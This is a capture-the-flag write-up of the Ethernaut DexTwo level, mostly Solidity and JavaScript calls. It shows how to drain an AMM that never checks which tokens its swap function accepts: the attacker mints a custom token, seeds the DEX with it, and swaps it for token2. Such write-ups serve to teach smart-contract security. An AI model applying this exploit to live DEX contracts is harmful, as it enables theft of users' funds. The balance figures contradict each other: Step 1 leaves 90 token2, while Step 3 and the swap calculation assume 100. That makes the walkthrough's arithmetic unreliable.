## Writeup: Ethernaut DexTwo How to Drain a DEX of Both Tokens
Level: DexTwo (Ethernaut)

### Goal: Drain the DEX contract of all token1 and token2 (0 token1 and 0 token2).

Contract: DexTwo is a simple AMM (Automated Market Maker) that allows swapping any ERC20 token. Unlike the regular Dex, it does not have a require checking whether from and to are token1/token2. This is the key vulnerability.

Code of the key function:
```solidity

function swap(address from, address to, uint256 amount) public {
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint256 swapAmount = getSwapAmount(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swapAmount);
    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
}

function getSwapAmount(address from, address to, uint256 amount) public view returns (uint256) {
    return ((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)));
}
```

Key observation: getSwapAmount uses balanceOf(address(this)) — i.e., the balance inside the DEX. If the DEX has 0 of the from token, it divides by zero → revert.
Initial state

    DEX: 100 token1, 100 token2

    Player: 10 token1, 10 token2

### Step 1: Standard swap sequence (beginner's mistake)

At first, I executed the standard sequence from the regular Dex walkthrough:
javascript

await contract.swap(token1, token2, 10)
await contract.swap(token2, token1, 20)
await contract.swap(token1, token2, 24)
await contract.swap(token2, token1, 30)
await contract.swap(token1, token2, 41)
await contract.swap(token2, token1, 45)

Result:

    DEX: 0 token1, 90 token2

    Player: 45 token1, 0 token2

Problem: In the regular Dex, this is enough to pass (condition: "0 token1 OR 0 token2"). But in DexTwo, the condition is stricter: "0 token1 AND 0 token2". 90 token2 remained, so the level was not completed.

Conclusion: The standard sequence is not enough for DexTwo. Another vulnerability must be used.
### Step 2: Attempt to use a custom token (EvilToken)

I decided to create my own ERC20 token with a huge supply and use it to drain the DEX.

EvilToken contract:
```solidity

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract HackToken is ERC20 {
    constructor() ERC20("Mwg", "MWG") {
        _mint(msg.sender, 1000000 * 10**18);
    }
}
```
Deployed in Remix, address: 0x...

Problem: The DEX has 0 EvilToken, so getSwapAmount divides by zero → revert. I must first introduce EvilToken into the DEX.
### Step 3: Introducing EvilToken into the DEX

To make the DEX hold any EvilToken, I sent 100 EvilToken directly to the DEX (via transfer, not swap):
javascript

await evil.methods.transfer(contract.address, "100000000000000000000").send({ from: player })

Result:

    DEX: 0 token1, 100 token2, 100 Evil

    Player: 45 token1, 0 token2, 100 Evil

Now the DEX holds Evil, so getSwapAmount no longer divides by zero.
### Step 4: Approving allowance

The DEX must be able to pull my EvilToken during swap. I approved the allowance:
```javascript

await evil.methods.approve(contract.address, "200000000000000000000").send({ from: player })
```
### Step 5: Swapping Evil for token2

Since the DEX had 0 token1 and 100 token2, I could only swap Evil for token2.
```javascript

await contract.swap(evilAddr, token2, "100000000000000000000")
```
Calculation of getSwapAmount:

    from = Evil, to = token2

    balanceOf(from) = 100 (Evil in DEX)

    balanceOf(to) = 100 (token2 in DEX)

    swapAmount = (100 * 100) / 100 = 100

Result:

    DEX: 0 token1, 0 token2, 200 Evil

    Player: 45 token1, 100 token2, 0 Evil

The DEX has 0 token1 and 0 token2 → LEVEL COMPLETED
Summary – what exactly worked?
Step	Action	DEX token1	DEX token2	DEX Evil
0	Initial state	100	100	0
1	Standard swap sequence	0	90	0
2	Transfer 100 Evil to DEX	0	90	100
3	Swap 100 Evil for token2	0	0	200

Key elements of success:

    Vulnerability in DexTwo: no require checking whether from and to are token1/token2 — any token can be used.

    Transfer Evil to DEX: the DEX must hold some EvilToken so getSwapAmount doesn't divide by zero.

    Allowance: the DEX must have approval to spend EvilToken.

    Matching the amount: swapping 100 Evil for 100 token2 (not 200, because the DEX doesn't have 200 token2).

Lessons learned

    DexTwo vs Dex: DexTwo has a stricter condition (0 token1 AND 0 token2) and no require on tokens, that's the vulnerability.

    getSwapAmount: uses balanceOf(address(this)), the DEX must hold the from token to avoid division by zero.

    Custom token: a powerful tool in attacks on AMMs, it lets you manipulate the exchange rate.

    Don't blindly copy walkthroughs: the standard sequence for Dex does not work in DexTwo.

Level completed
